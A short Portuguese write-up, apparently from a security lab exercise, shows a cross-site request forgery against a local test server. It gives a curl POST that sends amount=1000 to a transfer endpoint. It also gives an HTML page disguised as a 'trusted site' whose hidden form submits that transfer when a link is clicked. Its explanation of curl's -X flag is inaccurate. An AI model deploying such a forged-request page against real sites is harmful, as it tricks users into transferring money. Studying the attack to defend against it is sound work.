 
esse comando vai executar uma chamada POST no site alvo de modo que o -X demostra qual tipo de vulnerabilidade seria e o -d define o que deve ser alterado, por fim o url alvo neste caso e o sub dominio e modificamos o id amount que esta relacionado com a tranferencia de valores do site. neste caso fizemos a trasnferencia do valor total. 

curl -X POST -d "amount=1000" http://localhost:8080/transfer

tambem usando ao inves de usar o curl de forma direta fiz um script html que faz isto em um painel


  1 <!DOCTYPE html>
  2 <html>
  3 <head>
  4         <title>site confiavel</title>
  5 </head>
  6 <body>
  7         <h2> roubando contas <h2>
  8         <form id="form" action="http://localhost:8080/transfer" method="POST">
  9         <input type="hidden" name="amount" value="1000">
 10         <a href="#" onclick=document.getElementById("form").submit()> link </a>         
 11         </form>
 12 </body>
 13 </html>
 14 
